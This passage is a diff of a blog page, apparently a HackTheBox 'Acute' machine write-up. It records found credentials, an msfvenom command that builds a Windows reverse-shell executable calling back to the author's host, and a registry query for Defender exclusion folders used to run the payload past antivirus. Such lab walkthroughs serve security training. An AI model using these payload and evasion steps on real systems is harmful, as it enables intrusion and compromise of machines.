@@ -114,7 +114,20 @@ EDavies
 IMonks
 JMorgan
 LHopkins
-</code></pre><h2 id=user>User</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>The working creds are <code>EDavies:Password1!</code></li></ul><p><img src=./images/4.png alt></p><p><img src=./images/5.png alt></p><ul><li>Let&rsquo;s upgrade from webshell to reverse shell<ul><li>Generate a payload using <code>msfvenom</code> and upload it to box</li></ul></li></ul><pre tabindex=0><code>└─$ msfvenom -p windows/x64/shell_reverse_tcp LPORT=6666 LHOST=10.10.16.9 -f exe -o rev.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+</code></pre><ul><li>But the shell doesn&rsquo;t work due to <code>Defender</code></li></ul><p><img src=./images/6.png alt></p><ul><li>We can check if there are any exclusion folders in <code>Defender</code></li></ul><pre tabindex=0><code>PS C:\Users\edavies\Documents&gt; reg query &#34;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&#34;
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+
+    C:\Utils    REG_DWORD    0x0
+    C:\Windows\System32    REG_DWORD    0x0
+</code></pre><ul><li>Run the payload</li></ul><p><img src=./images/7.png alt></p><ul><li>Suddenly, the shell closes<ul><li>So I tried with the <code>nc</code></li><li>But it closes too</li></ul></li></ul><p><img src=./images/9.png alt></p><p><img src=./images/8.png alt></p><ul><li>I would probably have to try <code>meterpreter</code> and migrate to another process</li></ul><h2 id=user>User</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2facute%2f&text=%5bHTB%5d%20Machine%3a%20Acute&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2facute%2f&title=%5bHTB%5d%20Machine%3a%20Acute" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2facute%2f&title=%5bHTB%5d%20Machine%3a%20Acute" target=_blank><i class="fab fa-linkedin"></i></a>
